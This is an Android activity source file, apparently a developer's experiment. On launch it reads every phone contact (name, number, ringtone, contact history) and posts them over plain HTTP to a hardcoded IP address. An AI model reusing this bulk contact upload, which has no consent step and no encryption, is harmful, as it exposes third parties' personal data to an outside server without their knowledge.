package com.boomgaarden_corney.android.contacts;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class ContactsMainActivity extends Activity {

	private final String DEBUG_TAG = "DEBUG_CONTACTS";
	private final String SERVER_URL = "http://54.86.68.241/contacts/test.php";

	private TextView txtResults;

	private String errorMsg;
	private String contactName;
	private String contactPhoneNumber;
	private String contactRingTone;
	private String contactLastTimeContacted;
	private String contactNumTimesContected;
	
	private int counter = 1;

	private List<NameValuePair> paramsDevice = new ArrayList<NameValuePair>();
	private List<NameValuePair> paramsErrorMsg = new ArrayList<NameValuePair>();
	private List<NameValuePair> paramsContacts = new ArrayList<NameValuePair>();


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_contacts_main);

		txtResults = (TextView) this.findViewById(R.id.txtResults);
	
		setDeviceData();
		showDeviceData();
		//sendDeviceData();
		
		setContactsData(this.getContentResolver());		

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.contacts_main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	private String buildPostRequest(List<NameValuePair> params)
			throws UnsupportedEncodingException {
		StringBuilder result = new StringBuilder();
		boolean first = true;

		for (NameValuePair pair : params) {
			if (first)
				first = false;
			else
				result.append("&");

			result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
			result.append("=");
			result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
		}

		return result.toString();
	}

	private String sendHttpRequest(String myURL, String postParameters)
			throws IOException {

		URL url = new URL(myURL);

		// Setup Connection
		HttpURLConnection conn = (HttpURLConnection) url.openConnection();
		conn.setReadTimeout(10000); /* in milliseconds */
		conn.setConnectTimeout(15000); /* in milliseconds */
		conn.setRequestMethod("POST");
		conn.setDoOutput(true);

		// Setup POST query params and write to stream
		OutputStream ostream = conn.getOutputStream();
		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(
				ostream, "UTF-8"));

		if (postParameters.equals("DEVICE")) {
			writer.write(buildPostRequest(paramsDevice));
		} else if (postParameters.equals("CONTACTS")) {
			writer.write(buildPostRequest(paramsContacts));
			paramsContacts = new ArrayList<NameValuePair>();
		} else if (postParameters.equals("ERROR_MSG")) {
			writer.write(buildPostRequest(paramsErrorMsg));
			paramsErrorMsg = new ArrayList<NameValuePair>();
		} 
		
		writer.flush();
		writer.close();
		ostream.close();

		// Connect and Log response
		conn.connect();
		int response = conn.getResponseCode();
		Log.d(DEBUG_TAG, "The response is: " + response);

		conn.disconnect();
		
		return String.valueOf(response);

	}

	private class SendHttpRequestTask extends AsyncTask<String, Void, String> {

		// @params come from SendHttpRequestTask.execute() call
		@Override
		protected String doInBackground(String... params) {
			// params comes from the execute() call: params[0] is the url,
			// params[1] is type POST
			// request to send - i.e. whether to send Device or Accelerometer
			// parameters.
			try {
				return sendHttpRequest(params[0], params[1]);
			} catch (IOException e) {
				setErrorMsg("Unable to retrieve web page. URL may be invalid.");
				showErrorMsg();
				return errorMsg;
			}
		}
	}

	private void setDeviceData() {
		paramsDevice.add(new BasicNameValuePair("Device", Build.DEVICE));
		paramsDevice.add(new BasicNameValuePair("Brand", Build.BRAND));
		paramsDevice.add(new BasicNameValuePair("Manufacturer",
				Build.MANUFACTURER));
		paramsDevice.add(new BasicNameValuePair("Model", Build.MODEL));
		paramsDevice.add(new BasicNameValuePair("Product", Build.PRODUCT));
		paramsDevice.add(new BasicNameValuePair("Board", Build.BOARD));
		paramsDevice.add(new BasicNameValuePair("Android API", String
				.valueOf(Build.VERSION.SDK_INT)));
	}

	private void setErrorMsg(String error) {
		errorMsg = error;
		paramsErrorMsg.add(new BasicNameValuePair("Error", errorMsg));
	}
	
	private void setContactsData(ContentResolver contentResolver) {
		Cursor contactList = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
		while (contactList.moveToNext())
        {	
			contactName = contactList.getString(contactList.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
			contactPhoneNumber = contactList.getString(contactList.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
			contactRingTone = contactList.getString(contactList.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CUSTOM_RINGTONE));
			contactLastTimeContacted = contactList.getString(contactList.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
			contactNumTimesContected = contactList.getString(contactList.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));
			
			if(contactRingTone == null){
				contactRingTone = "No custom ring tone detected for this contact.";
			}
			
			paramsContacts.add(new BasicNameValuePair("--------------------------", " "));
			paramsContacts.add(new BasicNameValuePair("Contact Count: ", String.valueOf(counter)));
			paramsContacts.add(new BasicNameValuePair(counter + "Name: ", contactName));
			paramsContacts.add(new BasicNameValuePair(counter + "Phone Number: ", contactPhoneNumber));
			paramsContacts.add(new BasicNameValuePair(counter + "Ring Tone: ", contactRingTone));
			paramsContacts.add(new BasicNameValuePair(counter + "Last Time Contacted: ", contactLastTimeContacted));
			paramsContacts.add(new BasicNameValuePair(counter + "Number of Times Contacted: ", contactNumTimesContected));
			
			counter++;
			showContactsData();
        }	
		
		sendContactsData();
	}

	private void showDeviceData() {
		// Display and store (for sending via HTTP POST query) device
		// information
		txtResults.append("Device: " + Build.DEVICE + "\n");
		txtResults.append("Brand: " + Build.BRAND + "\n");
		txtResults.append("Manufacturer: " + Build.MANUFACTURER + "\n");
		txtResults.append("Model: " + Build.MODEL + "\n");
		txtResults.append("Product: " + Build.PRODUCT + "\n");
		txtResults.append("Board: " + Build.BOARD + "\n");
		txtResults.append("Android API: "
				+ String.valueOf(Build.VERSION.SDK_INT) + "\n");

		txtResults.append("\n");

	}

	private void showErrorMsg() {
		Log.d(DEBUG_TAG, errorMsg);
		txtResults.append(errorMsg + "\n");
	}

	private void showContactsData() {
		StringBuilder results = new StringBuilder();

		results.append("-----------------------\n");
		results.append("Contact Count: " + String.valueOf(counter) + "\n");
		results.append("Name: " + contactName + "\n");
		results.append("Phone Number: " + contactPhoneNumber + "\n");
		results.append("Ring Tone: " + contactRingTone + "\n");
		results.append("Last Time Contacted: " + contactLastTimeContacted + "\n");
		results.append("Number of Times Contacted: " + contactNumTimesContected + "\n");
		
		txtResults.append(new String(results));
		txtResults.append("\n");
	}


	private void sendDeviceData() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "DEVICE");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

	private void sendErrorMsg() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "ERROR_MSG");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

	private void sendContactsData() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "CONTACTS");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}



}
